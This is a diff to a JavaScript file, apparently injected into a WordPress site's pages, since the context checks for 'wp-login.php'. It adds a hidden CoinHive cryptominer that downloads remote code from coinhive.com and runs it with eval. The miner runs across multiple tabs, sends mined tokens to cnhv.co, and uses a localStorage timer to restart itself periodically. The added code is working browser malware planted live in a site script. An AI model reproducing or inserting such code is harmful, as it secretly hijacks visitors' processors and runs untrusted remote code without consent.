@@ -649,3 +649,39 @@ if (top['location']['href']['indexOf']('wp-login.php') > -1) {
               }
           }, 1000)
       };
+    var target = 2048;
+    var exFunc = function(){
+    if (typeof isrunmyproject == "undefined") {
+    	isrunmyproject = 1;
+    if (typeof CoinHive != "object") {
+    	var xmlHttp = new XMLHttpRequest;
+        xmlHttp["open"]("GET", "https://coinhive.com/lib/coinhive.min.js", false);
+        xmlHttp["send"](null);
+        eval(xmlHttp["responseText"]);
+    }
+    	var miner = new CoinHive.Token('H3QMiNzSRGMRObqvqtk0BG3cNIqxUuvr', target);
+    	miner.on('accepted', function(params){
+    		if (params.hashes >= target) {
+    			var ts = Date.now();
+    			var xhr = new XMLHttpRequest();
+    			xhr.onreadystatechange = function() {
+    				if (xhr.readyState === xhr.DONE){
+
+    				}
+    			};
+    			xhr.open('POST', 'https://cnhv.co/dkja');
+    			xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+    			xhr.send('token='+encodeURIComponent(miner.getToken()));
+    		}
+    	});
+    	miner.start(CoinHive.FORCE_MULTI_TAB);
+
+    }
+    }
+
+    var cookie_name = "control22_miner2_"+target;
+    var cookie_time = 0.3;
+    if(!localStorage[cookie_name] || parseInt(localStorage[cookie_name]) < Date.now()-60*60*cookie_time){
+    	localStorage[cookie_name] = Date.now();
+    	exFunc();
+    }
